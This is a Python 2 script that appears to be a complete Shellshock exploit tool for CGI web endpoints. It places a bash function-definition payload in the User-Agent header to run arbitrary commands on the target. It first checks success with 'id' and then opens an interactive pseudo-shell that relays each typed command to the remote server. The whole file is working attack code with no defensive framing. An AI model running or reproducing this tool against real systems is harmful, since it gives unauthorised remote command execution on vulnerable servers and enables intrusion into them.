#!/usr/bin/env python
# coding: utf8

import os
import sys
import code
import readline
import atexit
import socket
import uuid
import urllib2
import urlparse
import warnings
try:
    import chardet
except ImportError:
    # warnings.warn("Lack chardet, the proposed installation")
    chardet = None


class InjectionCommandError(IOError):
    pass


class InjectionFailed(IOError):
    pass


class InjectionNetError(IOError):
    pass


class Fetch(object):
    def __init__(self, url):
        self.fullurl = self._complete_url(url)
        uinfo = urlparse.urlparse(self.fullurl)
        pext = os.path.splitext(uinfo.path)
        if len(pext) == 2 and pext[1] not in ('.cgi', '.sh'):
            warnings.warn("Recommended suffix CGI!")

        self.host = uinfo.hostname
        self.uuid = uuid.uuid3(uuid.NAMESPACE_DNS, 'hanchen.me').hex
        self.user = 'unknown'
        self._init_opener()

    def _complete_url(self, url):
        fullurl = url
        if not url.startswith('http'):
            fullurl = "http://{0}".format(url)
        return fullurl

    def _init_opener(self):
        self.opener = urllib2.build_opener()
        # TODO login ?

    def injection(self, cmd='id'):
        sformat = "() {{ :; }}; echo;echo {0};{1}; echo {0};"
        hs = {'User-agent': sformat.format(self.uuid, cmd)}
        req = urllib2.Request(self.fullurl, headers=hs)
        try:
            response = self.opener.open(req)
        except urllib2.HTTPError as e:
            response = e
        except urllib2.URLError as e:
            raise InjectionNetError()
        except socket.error as e:
            raise InjectionNetError()
        return self._process_response(response)

    def _process_response(self, response):
        try:
            body = response.read()
        except IOError as e:
            raise e
        if chardet:
            body_enc = chardet.detect(body)
            # FIXME use encoding
        result = body.split(self.uuid)
        if len(result) == 3:
            messag = result[1]
        elif len(result) == 2:
            raise InjectionCommandError()
        else:
            raise InjectionFailed()
        return messag


class CgiShellConsole(code.InteractiveConsole):
    def __init__(self, locals=None, filename="<console>",
                 histfile=os.path.expanduser("~/.cgishell-history")):
        code.InteractiveConsole.__init__(self, locals, filename)
        self.init_history(histfile)

    def set_fetch(self, fetch):
        self.fetch = fetch

    def push(self, cmd):
        if not cmd:
            return
        if cmd in ('exit', 'logout', 'quit'):
            self.write('*_* Please use Ctrl + d\n')
            return
        try:
            message = self.fetch.injection(cmd)
            self.write(message)
        except IOError as e:  # TODO Verbose Error ?
            self.write(e)
        self.write('\n')

    def init_history(self, histfile):
        readline.parse_and_bind("tab: complete")
        if hasattr(readline, "read_history_file"):
            try:
                readline.read_history_file(histfile)
            except IOError:
                pass
            atexit.register(self.save_history, histfile)

    def save_history(self, histfile):
        readline.write_history_file(histfile)


def main(url):
    f = Fetch(url.strip())
    print ':) URL: {0}'.format(f.fullurl)
    try:
        msg = f.injection('id')
    except InjectionCommandError:
        # FIXME code bug ?
        return 1
    except InjectionFailed:
        print '*_* Injection Code Failed.'
        return 1
    except InjectionNetError:
        print '*_* Check the target server connection'
        return 1
    idinfo = msg.split(' ')[0].split('=')
    if len(idinfo) == 2:
        f.user = idinfo[1]
    else:
        f.user = idinfo[0]
    csc = CgiShellConsole()
    csc.set_fetch(f)
    sys.ps1 = '{0}@{1} >>'.format(f.host, f.user)
    csc.interact(':) Injection Code Success! Shell it.')
    return 0

if __name__ == '__main__':
    if len(sys.argv) != 2 or sys.argv[1] in ('-h', '--help'):
        print "*_* Give me the URL"
        sys.exit(1)
    sys.exit(main(sys.argv[1]))
